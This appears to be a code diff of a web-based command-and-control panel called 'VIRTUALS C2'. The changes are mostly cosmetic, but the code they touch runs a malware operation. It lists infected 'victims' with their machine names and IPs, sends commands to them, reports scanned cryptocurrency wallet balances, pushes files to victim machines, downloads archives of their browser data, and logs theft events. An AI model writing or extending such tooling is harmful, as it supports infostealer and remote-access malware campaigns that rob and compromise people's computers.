-function updateActivity(){const el=document.getElementById('activityList');const v=Object.values(state.victims).filter(x=>x.status==='Online');if(v.length===0){el.innerHTML='<div style="color:#444458;font-size:8px;">no activity</div>';return;}const acts=['idle','typing','reading','thinking','responding','processing'];el.innerHTML=v.map(v=>{const act=acts[Math.floor(Math.random()*acts.length)];return `<div class="activity-item"><span class="act-pc">${v.pc}</span><span class="act-action">${act}</span><span class="act-time">${new Date().toLocaleTimeString()}</span></div>`}).join('');}
+function updateActivity(){const el=document.getElementById('activityList');const v=Object.values(state.victims).filter(x=>x.status==='Online');if(v.length===0){el.innerHTML='<div style="color:#444458;font-size:10px;">no activity</div>';return;}const acts=['idle','typing','reading','thinking','responding','processing'];el.innerHTML=v.map(v=>{const act=acts[Math.floor(Math.random()*acts.length)];return `<div class="activity-item"><span class="act-pc">${v.pc}</span><span class="act-action">${act}</span><span class="act-time">${new Date().toLocaleTimeString()}</span></div>`}).join('');}
 function addLog(type,content){const el=document.getElementById('logOutput');state.logCount++;document.getElementById('logCount').textContent=state.logCount;let cls='system';if(type==='success')cls='success';else if(type==='failed')cls='failed';else if(type==='steal')cls='steal';else if(type==='file')cls='file';else if(type==='embed')cls='embed';const time=new Date().toLocaleTimeString();el.innerHTML='<div class="log-item"><span class="log-time">['+time+']</span><span class="type '+cls+'">'+type+'</span><span class="log-content">'+content+'</span></div>'+el.innerHTML;if(el.children.length>100){el.removeChild(el.lastChild);}}
-function sendCommand(cmd){if(!state.selectedVictim){add('system','⚠️ select a victim','system');addLog('failed','No victim selected');return;}add('us','⚡ /'+cmd,'us');addLog('info','Executing '+cmd);api('sendCommand',{victim_id:state.selectedVictim,command:cmd},d=>{if(d.success){if(!state.commands[state.selectedVictim])state.commands[state.selectedVictim]=[];state.commands[state.selectedVictim].push({command:cmd,result:d.result,time:new Date().toLocaleTimeString()});state.cmdCount++;add('us','✅ success','us');addLog('success','Command '+cmd+' completed');if(cmd==='scan'&&d.wallets){d.wallets.forEach(w=>{add('wallet','💰 '+w.currency+': '+w.balance+' ($'+w.usd+')','wallet');addLog('wallet',w.currency+': '+w.balance);});}if(d.embed){addEmbed(d.embed);addLog('embed',d.embed.title);}show(state.selectedVictim);update();}else{add('us','❌ failed','us');addLog('failed','Command '+cmd+' failed');}});}
+function sendCommand(cmd){if(!state.selectedVictim){add('system','⚠ select a victim','system');addLog('failed','No victim selected');return;}add('us','⚡ /'+cmd,'us');addLog('info','Executing '+cmd);api('sendCommand',{victim_id:state.selectedVictim,command:cmd},d=>{if(d.success){if(!state.commands[state.selectedVictim])state.commands[state.selectedVictim]=[];state.commands[state.selectedVictim].push({command:cmd,result:d.result,time:new Date().toLocaleTimeString()});state.cmdCount++;add('us','✅ success','us');addLog('success','Command '+cmd+' completed');if(cmd==='scan'&&d.wallets){d.wallets.forEach(w=>{add('wallet','💰 '+w.currency+': '+w.balance+' ($'+w.usd+')','wallet');addLog('wallet',w.currency+': '+w.balance);});}if(d.embed){addEmbed(d.embed);addLog('embed',d.embed.title);}show(state.selectedVictim);update();}else{add('us','❌ failed','us');addLog('failed','Command '+cmd+' failed');}});}
 function addEmbed(embed){const el=document.getElementById('chatMessages');const t=new Date().toLocaleTimeString();el.innerHTML+=`<div class="msg"><span class="time">[${t}]</span><div class="embed-box" style="--embed-color:${embed.color||'#44aaff'}"><div class="embed-title">${embed.title}</div><div class="embed-content">${embed.content}</div><div class="embed-footer">${embed.footer||''}</div></div></div>`;el.scrollTop=el.scrollHeight;}
-function sendMessage(){const input=document.getElementById('chatInput');const msg=input.value.trim();if(!msg)return;input.value='';if(msg.startsWith('/')){sendCommand(msg.substring(1).toLowerCase());}else{if(!state.selectedVictim){add('system','⚠️ select a victim','system');addLog('failed','No victim selected');return;}add('us','📨 '+msg,'us');add('victim','💬 '+msg,'victim');addLog('info','Message sent');}}
-function uploadFile(){if(!state.selectedVictim){add('system','⚠️ select a victim','system');addLog('failed','No victim selected');return;}const input=document.getElementById('fileInput');if(!input.files||!input.files[0]){add('system','⚠️ select a file','system');addLog('failed','No file selected');return;}const file=input.files[0];const formData=new FormData();formData.append('file',file);formData.append('victim_id',state.selectedVictim);const progress=document.getElementById('uploadProgress');const bar=document.getElementById('progressBar');progress.style.display='block';bar.style.width='0%';add('us','📤 '+file.name,'us');addLog('file','Uploading '+file.name);let interval=setInterval(()=>{const cur=parseFloat(bar.style.width)||0;if(cur<90){bar.style.width=(cur+10)+'%';}},200);fetch('/upload-file',{method:'POST',body:formData}).then(r=>r.json()).then(d=>{clearInterval(interval);bar.style.width='100%';setTimeout(()=>{progress.style.display='none';bar.style.width='0%';},500);if(d.success){add('file','✅ uploaded','file');addLog('success','File uploaded');}else{add('system','❌ failed','system');addLog('failed','Upload failed');}}).catch(()=>{clearInterval(interval);bar.style.width='100%';setTimeout(()=>{progress.style.display='none';bar.style.width='0%';},500);add('system','❌ failed','system');addLog('failed','Upload error');});}
+function sendMessage(){const input=document.getElementById('chatInput');const msg=input.value.trim();if(!msg)return;input.value='';if(msg.startsWith('/')){sendCommand(msg.substring(1).toLowerCase());}else{if(!state.selectedVictim){add('system','⚠ select a victim','system');addLog('failed','No victim selected');return;}add('us','📨 '+msg,'us');add('victim','💬 '+msg,'victim');addLog('info','Message sent');}}
+function uploadFile(){if(!state.selectedVictim){add('system','⚠ select a victim','system');addLog('failed','No victim selected');return;}const input=document.getElementById('fileInput');if(!input.files||!input.files[0]){add('system','⚠ select a file','system');addLog('failed','No file selected');return;}const file=input.files[0];const formData=new FormData();formData.append('file',file);formData.append('victim_id',state.selectedVictim);const progress=document.getElementById('uploadProgress');const bar=document.getElementById('progressBar');progress.style.display='block';bar.style.width='0%';add('us','📤 '+file.name,'us');addLog('file','Uploading '+file.name);let interval=setInterval(()=>{const cur=parseFloat(bar.style.width)||0;if(cur<90){bar.style.width=(cur+10)+'%';}},200);fetch('/upload-file',{method:'POST',body:formData}).then(r=>r.json()).then(d=>{clearInterval(interval);bar.style.width='100%';setTimeout(()=>{progress.style.display='none';bar.style.width='0%';},500);if(d.success){add('file','✅ uploaded','file');addLog('success','File uploaded');}else{add('system','❌ failed','system');addLog('failed','Upload failed');}}).catch(()=>{clearInterval(interval);bar.style.width='100%';setTimeout(()=>{progress.style.display='none';bar.style.width='0%';},500);add('system','❌ failed','system');addLog('failed','Upload error');});}
 function downloadBrowserZip(){const victim=state.selectedVictim||'all';window.open('/download-browser-zip?victim_id='+victim,'_blank');}
 function add(sender,msg,type){const el=document.getElementById('chatMessages');const t=new Date().toLocaleTimeString();let cls='system';if(type==='us')cls='us';else if(type==='victim')cls='victim';else if(type==='embed')cls='embed';el.innerHTML+='<div class="msg"><span class="time">['+t+']</span><span class="sender '+cls+'">'+sender+'</span> '+msg+'</div>';el.scrollTop=el.scrollHeight;}
 function loadDemo(){if(Object.keys(state.victims).length===0){const f=[{id:'SNIN-1001',pc:'DESKTOP-ALPHA',ip:'192.168.1.10',os:'Windows 10 Pro',status:'Online',is_vm:0},{id:'SNIN-1002',pc:'LAPTOP-BETA',ip:'192.168.1.11',os:'Windows 11 Pro',status:'Online',is_vm:0},{id:'SNIN-1003',pc:'VM-TEST',ip:'192.168.1.12',os:'Windows 10 Pro',status:'Online',is_vm:1}];f.forEach(v=>{state.victims[v.id]=v;});render();update();add('system','🚀 victims loaded','system');addLog('system','3 victims online');select(f[0].id);}}
@@ -803,8 +792,8 @@ if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
     print("""
     ╔═══════════════════════════════════════════════════════════════╗
-    ║   VIRTUALS C2 - COMPLETE REDESIGN                          ║
-    ║   Landing Page · Admin Login · Full Control Panel          ║
+    ║   VIRTUALS C2 - PERFECT BALANCE EDITION                    ║
+    ║   Bigger Text · Smaller Chat Box · All Features            ║
     ╚═══════════════════════════════════════════════════════════════╝
     """)
     print(f"[*] Server: http://localhost:{port}")
